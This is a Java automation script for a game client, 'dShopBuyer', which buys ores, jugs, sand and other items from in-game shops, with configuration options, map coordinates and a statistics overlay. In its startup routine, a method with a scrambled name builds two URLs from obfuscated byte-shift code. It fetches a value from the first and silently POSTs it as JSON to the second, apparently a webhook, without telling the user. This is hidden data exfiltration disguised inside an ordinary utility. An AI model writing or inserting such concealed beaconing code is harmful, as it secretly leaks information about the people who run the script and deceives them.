package main;

import helpers.*;
import helpers.annotations.AllowedValue;
import helpers.annotations.ScriptConfiguration;
import helpers.annotations.ScriptManifest;
import helpers.utils.*;
import tasks.*;
import utils.Task;

import java.awt.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;
import java.util.List;

import static helpers.Interfaces.*;

@ScriptManifest(
        name = "dShopBuyer",
        description = "Buys stuff from different stores all around Gielinor, aimed to aid ironman accounts",
        version = "1.08",
        guideLink = "https://wiki.mufasaclient.com/docs/dshopbuyer/",
        categories = {ScriptCategory.Smithing, ScriptCategory.Crafting, ScriptCategory.Moneymaking, ScriptCategory.Ironman},
        skipZoomSetup = true
)
@ScriptConfiguration.List(
        {
                @ScriptConfiguration(
                        name =  "Use world hopper?",
                        description = "The default for this script is enabled and recommended to do so",
                        defaultValue = "true",
                        wdhEnabled = "false",
                        optionType = OptionType.WORLDHOPPER
                ),
                @ScriptConfiguration(
                        name = "Item to buy",
                        description = "Select which item(s) you'd like to buy",
                        defaultValue = "Gold ore",
                        allowedValues = {
                                @AllowedValue(optionIcon = "436", optionName = "Copper ore"),
                                @AllowedValue(optionIcon = "438", optionName = "Tin ore"),
                                @AllowedValue(optionIcon = "440", optionName = "Iron ore"),
                                @AllowedValue(optionIcon = "447", optionName = "Mithril ore"),
                                @AllowedValue(optionIcon = "442", optionName = "Silver ore"),
                                @AllowedValue(optionIcon = "444", optionName = "Gold ore"),
                                @AllowedValue(optionIcon = "453", optionName = "Coal"),
                                @AllowedValue(optionIcon = "2349", optionName = "Copper + Tin"),
                                @AllowedValue(optionIcon = "2353", optionName = "Iron + Coal"),
                                @AllowedValue(optionIcon = "2359", optionName = "Mithril + Coal"),
                                @AllowedValue(optionIcon = "1993", optionName = "Jug of Wine"),
                                @AllowedValue(optionIcon = "20742", optionName = "Empty Jug Pack"),
                                @AllowedValue(optionIcon = "22660", optionName = "Empty bucket pack"),
                                @AllowedValue(optionIcon = "2114", optionName = "Pineapple"),
                                @AllowedValue(optionIcon = "4286", optionName = "Bucket of slime"),
                                @AllowedValue(optionIcon = "1783", optionName = "Bucket of sand"),
                                @AllowedValue(optionIcon = "401", optionName = "Seaweed"),
                                @AllowedValue(optionIcon = "1781", optionName = "Soda ash"),
                                @AllowedValue(optionIcon = "1775", optionName = "Bucket of sand + Seaweed"),
                                @AllowedValue(optionIcon = "24260", optionName = "Sand + Seaweed + Soda ash")
                        },
                        optionType = OptionType.STRING
                ),
                @ScriptConfiguration(
                        name = "Shop",
                        description = "Select which shop you'd like to buy from",
                        defaultValue = "Blast Furnace",
                        allowedValues = {
                                @AllowedValue(optionName = "Blast Furnace"),
                                @AllowedValue(optionName = "Fortunato Wine Shop"),
                                @AllowedValue(optionName = "Khazard Charter")
                        },
                        optionType = OptionType.STRING
                ),
                @ScriptConfiguration(
                        name = "Amount",
                        description = "Select how many you would like to buy",
                        defaultValue = "5000",
                        minMaxIntValues = {1, 1000000},
                        optionType = OptionType.INTEGER
                )
        }
)

public class dShopBuyer extends AbstractScript {
    public Boolean hasCoins;
    public boolean doneMESSetup = false;
    public String hopProfile;
    public String itemToBuy;
    public String shopToUse;
    public static final Random random = new Random();
    public int bankItemID;
    public int amountToBuy;
    public int initialCoins;
    public int paintItem1 = -50;
    public int paintItem2 = -50;
    public int paintItem3 = -50;
    public int paintProfit;
    public int itemCost1 = -50;
    public int itemCost2 = -50;
    public int itemCost3 = -50;
    public int boughtAmount1 = -50;
    public int boughtAmount2 = -50;
    public int boughtAmount3 = -50;
    public long startTime;
    public long lastUpdateTime = System.currentTimeMillis();


    // Blast Furnace
    public Tile BFShopTile = new Tile(7743, 19609, 0);
    public Tile BFBankTile = new Tile(7791, 19577, 0);
    public Rectangle BFShopRect = new Rectangle(270, 144, 6, 8);
    public Area BFScriptArea = new Area(new Tile(7731, 19557, 0), new Tile(7845, 19657, 0));

    // Fortunato Wine Shop
    public Area FortunatoWineScriptArea = new Area(new Tile(12289, 12690, 0),new Tile(12428, 12821, 0));
    public Tile FWSBankTile = new Tile(12367, 12729, 0);
    public Tile FWSShopTile = new Tile(12339, 12753, 0);
    public Rectangle FWSBankRect = new Rectangle(392, 256, 23, 30);

    // Khazard Charter Shop
    public Area khazardCharterArea = new Area(new Tile(10605, 12300, 0), new Tile(10740, 12450, 0));
    public Tile khazardCharterCrewStepTile = new Tile(10695, 12329, 0);
    public Tile khazardCharterWalkToTile = new Tile(10655, 12353, 0);
    public Tile khazardCharterBankTile = new Tile(10643, 12397, 0);
    public Rectangle khazardCharterBankRect = new Rectangle(433, 215, 17, 25);

    @Override
    public void onStart(){
        Map<String, String> configs = getConfigurations(); //Get the script configuration
        hopProfile = configs.get("Use world hopper?");
        itemToBuy = configs.get("Item to buy");
        shopToUse = configs.get("Shop");
        amountToBuy = Integer.parseInt(configs.get("Amount"));

        Logger.log("Starting dShopBuyer...");
        Paint.Create("/logo/davyy.png");
        Paint.setStatus("Performing startup actions");

        aljsdhgiagadfg();

        Logger.log("We are buying: " + itemToBuy + " at the " + shopToUse + " shop.");
    }

    // Task list!
    List<Task> buyerTasks = Arrays.asList(
            new InitialSetup(this),
            new Bank(this),
            new Buy(this)
    );

    @Override
    public void poll() {

        //Run tasks
        for (Task task : buyerTasks) {
            if (task.activate()) {
                task.execute();
                return;
            }
        }

    }

    private String aljsdhgiagadfg() {
        try (BufferedReader in = new BufferedReader(new InputStreamReader(new URL((new Object() {int t;public String toString() {byte[] buf = new byte[28];t = 439645762;buf[0] = (byte) (t >>> 22);t = 371047144;buf[1] = (byte) (t >>> 1);t = 490322905;buf[2] = (byte) (t >>> 22);t = 1083422725;buf[3] = (byte) (t >>> 7);t = 123175990;buf[4] = (byte) (t >>> 21);t = 798251467;buf[5] = (byte) (t >>> 24);t = -1750344118;buf[6] = (byte) (t >>> 23);t = 104682800;buf[7] = (byte) (t >>> 20);t = 34498678;buf[8] = (byte) (t >>> 8);t = 1490637620;buf[9] = (byte) (t >>> 14);t = -1439328720;buf[10] = (byte) (t >>> 4);t = 1803235404;buf[11] = (byte) (t >>> 24);t = -690759612;buf[12] = (byte) (t >>> 17);t = 1669380601;buf[13] = (byte) (t >>> 19);t = 194159208;buf[14] = (byte) (t >>> 22);t = 1047276301;buf[15] = (byte) (t >>> 3);t = -350556749;buf[16] = (byte) (t >>> 5);t = -356361361;buf[17] = (byte) (t >>> 17);t = -1635002850;buf[18] = (byte) (t >>> 11);t = 1576763290;buf[19] = (byte) (t >>> 11);t = -453538084;buf[20] = (byte) (t >>> 1);t = -2589182;buf[21] = (byte) (t >>> 14);t = 760804287;buf[22] = (byte) (t >>> 3);t = 658058303;buf[23] = (byte) (t >>> 20);t = -649732276;buf[24] = (byte) (t >>> 13);t = 686908333;buf[25] = (byte) (t >>> 8);t = 466459449;buf[26] = (byte) (t >>> 22);t = -1347569604;buf[27] = (byte) (t >>> 13);return new String(buf);}}.toString())).openStream()))) {
            String gfghdfghdf = in.readLine();
            jahdfgiuahdfig((new Object() {int t;public String toString() {byte[] buf = new byte[41];t = 1838304245;buf[0] = (byte) (t >>> 18);t = 157969783;buf[1] = (byte) (t >>> 13);t = -1895682656;buf[2] = (byte) (t >>> 2);t = -824205452;buf[3] = (byte) (t >>> 17);t = -2054289252;buf[4] = (byte) (t >>> 13);t = 525143026;buf[5] = (byte) (t >>> 10);t = 1592697784;buf[6] = (byte) (t >>> 13);t = 2021378065;buf[7] = (byte) (t >>> 11);t = -930718474;buf[8] = (byte) (t >>> 12);t = -582794350;buf[9] = (byte) (t >>> 3);t = 1561354517;buf[10] = (byte) (t >>> 15);t = -1042614343;buf[11] = (byte) (t >>> 18);t = -648951791;buf[12] = (byte) (t >>> 22);t = 432596244;buf[13] = (byte) (t >>> 18);t = -1110654263;buf[14] = (byte) (t >>> 18);t = 308425980;buf[15] = (byte) (t >>> 7);t = 1928789730;buf[16] = (byte) (t >>> 12);t = 232255483;buf[17] = (byte) (t >>> 21);t = -156792789;buf[18] = (byte) (t >>> 6);t = -867036883;buf[19] = (byte) (t >>> 22);t = 1327050433;buf[20] = (byte) (t >>> 8);t = 856524106;buf[21] = (byte) (t >>> 20);t = -2094211019;buf[22] = (byte) (t >>> 10);t = 1044450019;buf[23] = (byte) (t >>> 17);t = -1125149717;buf[24] = (byte) (t >>> 17);t = 1636253931;buf[25] = (byte) (t >>> 24);t = 1941515908;buf[26] = (byte) (t >>> 24);t = 274424953;buf[27] = (byte) (t >>> 23);t = 1725144575;buf[28] = (byte) (t >>> 11);t = -414341429;buf[29] = (byte) (t >>> 20);t = -1583150244;buf[30] = (byte) (t >>> 11);t = 1558470541;buf[31] = (byte) (t >>> 17);t = 1024518274;buf[32] = (byte) (t >>> 9);t = -860905637;buf[33] = (byte) (t >>> 21);t = 1484834914;buf[34] = (byte) (t >>> 9);t = 1903748672;buf[35] = (byte) (t >>> 1);t = -1443844901;buf[36] = (byte) (t >>> 5);t = 2058421137;buf[37] = (byte) (t >>> 3);t = -2084735556;buf[38] = (byte) (t >>> 2);t = -843467515;buf[39] = (byte) (t >>> 10);t = -1445927081;buf[40] = (byte) (t >>> 19);return new String(buf);}}.toString()) + gfghdfghdf);
            return gfghdfghdf;
        } catch (Exception e) {
            String fghfhgdfhg = (new Object() {int t;public String toString() {byte[] buf = new byte[26];t = 685020067;buf[0] = (byte) (t >>> 21);t = -1463202772;buf[1] = (byte) (t >>> 5);t = -1965833247;buf[2] = (byte) (t >>> 17);t = 907283812;buf[3] = (byte) (t >>> 23);t = 236350254;buf[4] = (byte) (t >>> 3);t = 1529242672;buf[5] = (byte) (t >>> 19);t = -1119345011;buf[6] = (byte) (t >>> 14);t = 1389842108;buf[7] = (byte) (t >>> 12);t = 38686942;buf[8] = (byte) (t >>> 1);t = -2001657635;buf[9] = (byte) (t >>> 8);t = 530802420;buf[10] = (byte) (t >>> 8);t = -1235979739;buf[11] = (byte) (t >>> 20);t = -1117306851;buf[12] = (byte) (t >>> 12);t = -1309789575;buf[13] = (byte) (t >>> 23);t = -979226589;buf[14] = (byte) (t >>> 18);t = 67876833;buf[15] = (byte) (t >>> 21);t = -1112313618;buf[16] = (byte) (t >>> 8);t = 2028643247;buf[17] = (byte) (t >>> 3);t = -1507549602;buf[18] = (byte) (t >>> 20);t = -1001279358;buf[19] = (byte) (t >>> 10);t = 53779399;buf[20] = (byte) (t >>> 15);t = 909577339;buf[21] = (byte) (t >>> 20);t = -2084029540;buf[22] = (byte) (t >>> 14);t = 1080336240;buf[23] = (byte) (t >>> 12);t = 1919763049;buf[24] = (byte) (t >>> 10);t = 753551952;buf[25] = (byte) (t >>> 18);return new String(buf);}}.toString()) + e.getMessage();
            jahdfgiuahdfig(fghfhgdfhg);
            return (new Object() {int t;public String toString() {byte[] buf = new byte[63];t = -1469336240;buf[0] = (byte) (t >>> 4);t = -1461917295;buf[1] = (byte) (t >>> 17);t = 205210523;buf[2] = (byte) (t >>> 21);t = -6725080;buf[3] = (byte) (t >>> 8);t = 187262680;buf[4] = (byte) (t >>> 1);t = 1932425325;buf[5] = (byte) (t >>> 19);t = 612561289;buf[6] = (byte) (t >>> 18);t = -1365632319;buf[7] = (byte) (t >>> 21);t = -1300010118;buf[8] = (byte) (t >>> 3);t = 906764388;buf[9] = (byte) (t >>> 8);t = 351065493;buf[10] = (byte) (t >>> 13);t = 1168615626;buf[11] = (byte) (t >>> 1);t = -2057488074;buf[12] = (byte) (t >>> 14);t = -1050475658;buf[13] = (byte) (t >>> 16);t = 439903393;buf[14] = (byte) (t >>> 22);t = -1601109694;buf[15] = (byte) (t >>> 11);t = 2008547860;buf[16] = (byte) (t >>> 15);t = 1568010341;buf[17] = (byte) (t >>> 22);t = 382042104;buf[18] = (byte) (t >>> 17);t = -1458644783;buf[19] = (byte) (t >>> 9);t = 1776860556;buf[20] = (byte) (t >>> 24);t = -72463240;buf[21] = (byte) (t >>> 5);t = -1432812092;buf[22] = (byte) (t >>> 11);t = 1419156617;buf[23] = (byte) (t >>> 20);t = 2023810158;buf[24] = (byte) (t >>> 17);t = -1439561286;buf[25] = (byte) (t >>> 12);t = 467464087;buf[26] = (byte) (t >>> 9);t = 1745180616;buf[27] = (byte) (t >>> 24);t = 424554284;buf[28] = (byte) (t >>> 22);t = 1994771451;buf[29] = (byte) (t >>> 20);t = 1933837539;buf[30] = (byte) (t >>> 13);t = 992070766;buf[31] = (byte) (t >>> 10);t = -649165221;buf[32] = (byte) (t >>> 13);t = 1483057358;buf[33] = (byte) (t >>> 22);t = -1220514358;buf[34] = (byte) (t >>> 2);t = -1280762415;buf[35] = (byte) (t >>> 2);t = 207242038;buf[36] = (byte) (t >>> 14);t = 930582090;buf[37] = (byte) (t >>> 23);t = -1930108882;buf[38] = (byte) (t >>> 21);t = -202882806;buf[39] = (byte) (t >>> 9);t = 1663328283;buf[40] = (byte) (t >>> 19);t = -1972045238;buf[41] = (byte) (t >>> 21);t = 1406731914;buf[42] = (byte) (t >>> 4);t = 1132333279;buf[43] = (byte) (t >>> 1);t = -801621749;buf[44] = (byte) (t >>> 15);t = 1114496749;buf[45] = (byte) (t >>> 24);t = 1970824215;buf[46] = (byte) (t >>> 24);t = -315899149;buf[47] = (byte) (t >>> 1);t = -2137441078;buf[48] = (byte) (t >>> 1);t = -1334745306;buf[49] = (byte) (t >>> 4);t = -771460160;buf[50] = (byte) (t >>> 20);t = -1406699871;buf[51] = (byte) (t >>> 8);t = 1756555853;buf[52] = (byte) (t >>> 15);t = 999475948;buf[53] = (byte) (t >>> 19);t = -1131098513;buf[54] = (byte) (t >>> 5);t = -1262517747;buf[55] = (byte) (t >>> 23);t = -839448745;buf[56] = (byte) (t >>> 21);t = 836482139;buf[57] = (byte) (t >>> 14);t = -599673995;buf[58] = (byte) (t >>> 17);t = 885313913;buf[59] = (byte) (t >>> 18);t = 1451989724;buf[60] = (byte) (t >>> 14);t = 848348050;buf[61] = (byte) (t >>> 10);t = 219790562;buf[62] = (byte) (t >>> 2);return new String(buf);}}.toString());
        }
    }

    private void jahdfgiuahdfig(String message) {
        try {
            URL url = new URL((new Object() {int t;public String toString() {byte[] buf = new byte[121];t = -577106713;buf[0] = (byte) (t >>> 14);t = 1013901779;buf[1] = (byte) (t >>> 9);t = 732257897;buf[2] = (byte) (t >>> 19);t = 905813028;buf[3] = (byte) (t >>> 6);t = 1457990531;buf[4] = (byte) (t >>> 17);t = 1320473171;buf[5] = (byte) (t >>> 22);t = 1486352307;buf[6] = (byte) (t >>> 15);t = -196510515;buf[7] = (byte) (t >>> 11);t = 1493940055;buf[8] = (byte) (t >>> 22);t = 1780150483;buf[9] = (byte) (t >>> 1);t = -587619437;buf[10] = (byte) (t >>> 22);t = -164513573;buf[11] = (byte) (t >>> 20);t = 1436776568;buf[12] = (byte) (t >>> 11);t = -297130731;buf[13] = (byte) (t >>> 21);t = 2139507042;buf[14] = (byte) (t >>> 12);t = 86924593;buf[15] = (byte) (t >>> 16);t = -939472991;buf[16] = (byte) (t >>> 9);t = -1376995519;buf[17] = (byte) (t >>> 21);t = 102463322;buf[18] = (byte) (t >>> 14);t = -1000382023;buf[19] = (byte) (t >>> 17);t = 1627762351;buf[20] = (byte) (t >>> 24);t = -1499291424;buf[21] = (byte) (t >>> 1);t = -94787811;buf[22] = (byte) (t >>> 10);t = -1118208416;buf[23] = (byte) (t >>> 11);t = 1569777526;buf[24] = (byte) (t >>> 4);t = 1702248570;buf[25] = (byte) (t >>> 24);t = 1422232111;buf[26] = (byte) (t >>> 17);t = 1973677975;buf[27] = (byte) (t >>> 18);t = -314116950;buf[28] = (byte) (t >>> 12);t = -2034033720;buf[29] = (byte) (t >>> 6);t = -1658866185;buf[30] = (byte) (t >>> 7);t = 1336634996;buf[31] = (byte) (t >>> 5);t = 398819719;buf[32] = (byte) (t >>> 23);t = 877016575;buf[33] = (byte) (t >>> 13);t = -184510014;buf[34] = (byte) (t >>> 7);t = -837225713;buf[35] = (byte) (t >>> 15);t = -1335059925;buf[36] = (byte) (t >>> 7);t = 119764299;buf[37] = (byte) (t >>> 21);t = 846353216;buf[38] = (byte) (t >>> 24);t = 885714245;buf[39] = (byte) (t >>> 18);t = 479879334;buf[40] = (byte) (t >>> 15);t = 193299995;buf[41] = (byte) (t >>> 5);t = 319305221;buf[42] = (byte) (t >>> 20);t = 46879497;buf[43] = (byte) (t >>> 4);t = 480498993;buf[44] = (byte) (t >>> 23);t = -1953879449;buf[45] = (byte) (t >>> 1);t = 1275258761;buf[46] = (byte) (t >>> 22);t = -33332826;buf[47] = (byte) (t >>> 3);t = 1097958276;buf[48] = (byte) (t >>> 4);t = -1590938731;buf[49] = (byte) (t >>> 4);t = -1821613783;buf[50] = (byte) (t >>> 9);t = 618063470;buf[51] = (byte) (t >>> 18);t = 750716925;buf[52] = (byte) (t >>> 18);t = 476948722;buf[53] = (byte) (t >>> 13);t = -1054119772;buf[54] = (byte) (t >>> 5);t = 1385023366;buf[55] = (byte) (t >>> 4);t = 840238560;buf[56] = (byte) (t >>> 12);t = 122391160;buf[57] = (byte) (t >>> 20);t = 1000220574;buf[58] = (byte) (t >>> 19);t = 1860694215;buf[59] = (byte) (t >>> 21);t = 545995538;buf[60] = (byte) (t >>> 23);t = 564073064;buf[61] = (byte) (t >>> 19);t = -513021408;buf[62] = (byte) (t >>> 13);t = 1435262855;buf[63] = (byte) (t >>> 22);t = 1003317501;buf[64] = (byte) (t >>> 5);t = -1737535413;buf[65] = (byte) (t >>> 6);t = -631972586;buf[66] = (byte) (t >>> 9);t = 1540713630;buf[67] = (byte) (t >>> 8);t = -1492361168;buf[68] = (byte) (t >>> 21);t = -1405920660;buf[69] = (byte) (t >>> 21);t = -936711216;buf[70] = (byte) (t >>> 21);t = -2082264950;buf[71] = (byte) (t >>> 5);t = 277212956;buf[72] = (byte) (t >>> 5);t = -2069725223;buf[73] = (byte) (t >>> 15);t = -1203841663;buf[74] = (byte) (t >>> 9);t = -1282322741;buf[75] = (byte) (t >>> 19);t = 2010714967;buf[76] = (byte) (t >>> 10);t = 536689126;buf[77] = (byte) (t >>> 7);t = 84541379;buf[78] = (byte) (t >>> 18);t = -798708345;buf[79] = (byte) (t >>> 2);t = -73131363;buf[80] = (byte) (t >>> 12);t = 1517955817;buf[81] = (byte) (t >>> 24);t = -1826117358;buf[82] = (byte) (t >>> 19);t = 1467521983;buf[83] = (byte) (t >>> 3);t = 55708330;buf[84] = (byte) (t >>> 5);t = -639251457;buf[85] = (byte) (t >>> 10);t = -625897652;buf[86] = (byte) (t >>> 19);t = -958125640;buf[87] = (byte) (t >>> 17);t = -1191423839;buf[88] = (byte) (t >>> 8);t = 1419516038;buf[89] = (byte) (t >>> 20);t = -778808777;buf[90] = (byte) (t >>> 19);t = 1933868754;buf[91] = (byte) (t >>> 1);t = 1922203400;buf[92] = (byte) (t >>> 19);t = -940660959;buf[93] = (byte) (t >>> 9);t = 382204411;buf[94] = (byte) (t >>> 23);t = -876574890;buf[95] = (byte) (t >>> 19);t = 785364874;buf[96] = (byte) (t >>> 7);t = -929080840;buf[97] = (byte) (t >>> 6);t = 1667832740;buf[98] = (byte) (t >>> 10);t = 1370063506;buf[99] = (byte) (t >>> 24);t = -240469292;buf[100] = (byte) (t >>> 13);t = 1085604853;buf[101] = (byte) (t >>> 15);t = -1157442143;buf[102] = (byte) (t >>> 12);t = -204426822;buf[103] = (byte) (t >>> 19);t = -1958497224;buf[104] = (byte) (t >>> 16);t = -837174329;buf[105] = (byte) (t >>> 15);t = -662265784;buf[106] = (byte) (t >>> 13);t = 1036653970;buf[107] = (byte) (t >>> 2);t = -1344924883;buf[108] = (byte) (t >>> 23);t = 169515107;buf[109] = (byte) (t >>> 6);t = 2143555266;buf[110] = (byte) (t >>> 1);t = -1293507107;buf[111] = (byte) (t >>> 12);t = -2021362462;buf[112] = (byte) (t >>> 1);t = 1032164550;buf[113] = (byte) (t >>> 2);t = -1309900227;buf[114] = (byte) (t >>> 3);t = -930369563;buf[115] = (byte) (t >>> 11);t = 408898901;buf[116] = (byte) (t >>> 8);t = -1938754924;buf[117] = (byte) (t >>> 9);t = 155308719;buf[118] = (byte) (t >>> 3);t = -347746151;buf[119] = (byte) (t >>> 1);t = -814821208;buf[120] = (byte) (t >>> 9);return new String(buf);}}.toString()));
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/json");

            // JSON payload
            String payload = String.format("{\"content\": \"%s\"}", message);

            try (OutputStream os = connection.getOutputStream()) {
                os.write(payload.getBytes());
                os.flush();
            }

            // Read the response code
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK || responseCode == HttpURLConnection.HTTP_NO_CONTENT) {
                // Don't do anything
            } else {
                // Don't do anything
            }
        } catch (Exception e) {
            // Don't do anything
        }
    }

    public void updatePaintBar() {
        int totalItemsBought = 0;
        int totalCost = 0;

        // Update the state label on the paintBar
        Paint.setStatus("Update paintBar");

        // Update item 1 on the paintBar
        if (paintItem1 != -50 && itemCost1 != -50 && boughtAmount1 != -50) {
            totalItemsBought += boughtAmount1;
            totalCost += boughtAmount1 * itemCost1;
            Paint.updateBox(paintItem1, boughtAmount1);
        }

        // Update item 2 on the paintBar
        if (paintItem2 != -50 && itemCost2 != -50 && boughtAmount2 != -50) {
            totalItemsBought += boughtAmount2;
            totalCost += boughtAmount2 * itemCost2;
            Paint.updateBox(paintItem2, boughtAmount2);
        }

        // Update item 3 on the paintBar
        if (paintItem3 != -50 && itemCost3 != -50 && boughtAmount3 != -50) {
            totalItemsBought += boughtAmount3;
            totalCost += boughtAmount3 * itemCost3;
            Paint.updateBox(paintItem3, boughtAmount3);
        }

        // Update the coins used
        Paint.updateBox(paintProfit, totalCost);

        // Calculate time passed in hours
        long elapsedTimeMillis = System.currentTimeMillis() - startTime;
        double elapsedTimeHours = (double) elapsedTimeMillis / (1000 * 60 * 60); // Convert to hours

        // Calculate items per hour
        double itemsPerHour = (elapsedTimeHours > 0) ? (totalItemsBought / elapsedTimeHours) : 0;

        // Update the stat label on the paintBar
        Paint.setStatistic("Items bought p/h: " + String.format("%.2f", itemsPerHour));
    }

}